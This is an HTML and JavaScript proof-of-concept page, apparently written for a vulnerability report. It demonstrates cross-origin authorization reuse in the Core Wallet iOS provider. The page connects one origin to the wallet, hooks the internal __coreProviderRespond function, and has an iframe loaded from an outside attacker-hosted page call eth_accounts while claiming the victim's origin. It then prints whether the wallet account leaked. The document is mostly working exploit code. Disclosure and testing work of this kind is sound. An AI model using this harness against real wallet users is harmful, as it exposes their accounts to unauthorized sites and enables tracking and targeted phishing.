<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Core Wallet iOS - Authorization Reuse</title>

<style>
body{
  margin:20px;
  background:#fff;
  color:#111;
  font:16px -apple-system,BlinkMacSystemFont,sans-serif;
  line-height:1.5
}
button{padding:10px 14px;margin:6px 0}
pre{
  white-space:pre-wrap;
  overflow-wrap:anywhere;
  padding:12px;
  background:#f7f7f7;
  border:1px solid #ccc
}
#verdict{
  margin:12px 0;
  padding:12px;
  border:2px solid #b00000;
  color:#b00000;
  font-weight:bold
}
iframe{width:100%;height:60px;border:1px solid #ccc}
</style>
</head>

<body>

<h2>Core Wallet iOS - Cross-Origin Authorization Reuse</h2>

<p>
Victim / Origin A:<br>
<b id="originA"></b>
</p>

<p>
Attacker / Origin B:<br>
<b>https://azza1231.github.io</b>
</p>

<button id="connect">
1. Connect Origin A normally
</button>

<br>

<button id="attack" disabled>
2. Origin B calls eth_accounts as Origin A
</button>

<div id="verdict" hidden></div>

<pre id="log">Loading attacker iframe...</pre>

<iframe id="frame"></iframe>

<script>
const ATTACKER =
  'https://azza1231.github.io/pocpoc/attacker.html';

const TEST_ID = 733731;

const frame = document.getElementById('frame');
const log = document.getElementById('log');
const verdict = document.getElementById('verdict');
const attackButton = document.getElementById('attack');

const attackerOrigin = new URL(ATTACKER).origin;

document.getElementById('originA').textContent =
  location.origin;


function print(text = '') {
  log.textContent += text + '\n';
}


// Load Origin B
const child = new URL(ATTACKER);

child.searchParams.set(
  'victimOrigin',
  location.origin
);

frame.src = child.href;


addEventListener('message', event => {
  if (event.source !== frame.contentWindow) return;
  if (event.origin !== attackerOrigin) return;

  if (event.data?.type === 'READY') {
    log.textContent =
`Browser-confirmed Origin B:
${event.origin}

Victim Origin A:
${location.origin}

Ready. Connect Origin A first.`;
  }

  if (event.data?.type === 'REQUEST_SENT') {
    print('');
    print('Origin B sent native request:');
    print('Method: eth_accounts');
    print('Actual origin: ' + event.origin);
    print('Claimed origin: ' + location.origin);
    print('Request ID: ' + TEST_ID);
  }
});


// Step 1
document.getElementById('connect').onclick = async () => {

  if (!window.ethereum?.request) {
    print('ERROR: Core provider unavailable.');
    return;
  }

  try {
    print('');
    print('Connecting Origin A normally...');

    const accounts =
      await window.ethereum.request({
        method: 'eth_requestAccounts'
      });

    print(
      'Origin A authorized accounts: ' +
      JSON.stringify(accounts)
    );

    attackButton.disabled = false;

  } catch (e) {
    print(
      'Connect failed: ' +
      String(e?.message || e)
    );
  }
};


// Step 2
attackButton.onclick = () => {

  print('');
  print('=== CROSS-ORIGIN TEST ===');

  /*
   * Install observer NOW, after Core provider exists.
   */
  if (typeof window.__coreProviderRespond !== 'function') {
    print('ERROR: __coreProviderRespond unavailable.');
    return;
  }


  if (!window.__reuseObserverInstalled) {

    const original =
      window.__coreProviderRespond;

    window.__coreProviderRespond =
      function(id, error, result) {

        if (id === TEST_ID) {

          print('');
          print('Native response for Origin-B request:');
          print(
            JSON.stringify({
              id,
              error,
              result
            }, null, 2)
          );


          if (
            !error &&
            Array.isArray(result) &&
            result.length > 0
          ) {

            verdict.hidden = false;

            verdict.textContent =
              'VULNERABLE: Cross-origin Origin B obtained accounts using Origin A authorization.';

            print('');
            print('IMPACT PROVEN:');
            print(
              'Origin B received the wallet account authorized for Origin A.'
            );

          } else {

            print('');
            print(
              'Authorization reuse NOT proven on this run.'
            );
          }
        }

        return original.apply(this, arguments);
    };

    window.__reuseObserverInstalled = true;
  }


  print('Asking Origin B to call eth_accounts...');
  print('Actual Origin B: ' + attackerOrigin);
  print('Claimed Origin A: ' + location.origin);


  frame.contentWindow.postMessage(
    {
      type: 'READ_ACCOUNTS',
      id: TEST_ID
    },
    attackerOrigin
  );
};
</script>

</body>
</html>
